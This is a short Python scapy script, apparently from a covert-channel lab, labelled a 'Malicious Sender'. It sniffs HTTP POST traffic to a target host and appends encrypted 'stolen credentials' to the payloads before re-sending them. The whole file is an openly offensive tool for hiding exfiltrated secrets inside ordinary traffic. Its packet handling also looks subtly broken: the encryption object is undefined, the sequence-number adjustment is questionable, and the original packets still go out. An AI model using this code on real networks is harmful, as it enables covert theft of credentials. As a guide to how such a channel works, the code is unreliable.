from scapy.all import *
from cryptography.fernet import Fernet

from config import *

def inject_packet(pkt):

    # Listen for packets being sent to our fake malicious server on the correct port
    if IP in pkt and TCP in pkt and pkt[IP].dst == TARGET_IP and pkt[TCP].dport == TARGET_PORT:
        payload = bytes(pkt[TCP].payload)
        if b"POST" in payload and b"Content-Type: application" in payload:
            # Append our covert data to the new payload
            covert_message = f.encrypt(b"stolen_credentials:admin:pass123")
            new_payload = payload + MARKER + covert_message
            pkt[TCP].payload = Raw(new_payload)

            # Adjust the sequence number with new payload
            pkt[TCP].seq += len(payload)

            # Update checksums and length on the IP packet
            del pkt[IP].len
            del pkt[TCP].chksum
            del pkt[IP].chksum
            try:
                send(pkt, verbose=0)
                print(f"Malicious Sender: Injected {len(covert_message)} bytes")
            except Exception as e:
                print(f"Malicious Sender: Send error: {e}")
            return None
    return pkt

def start_malicious_interceptor():
    print("Malicious Sender: Starting packet sniffer...")
    try:
        sniff(filter=f"tcp port {TARGET_PORT} and host {TARGET_IP}", prn=inject_packet, store=0)
    except Exception as e:
        print(f"Malicious Sender: Error: {e}")

if __name__ == "__main__":
    start_malicious_interceptor()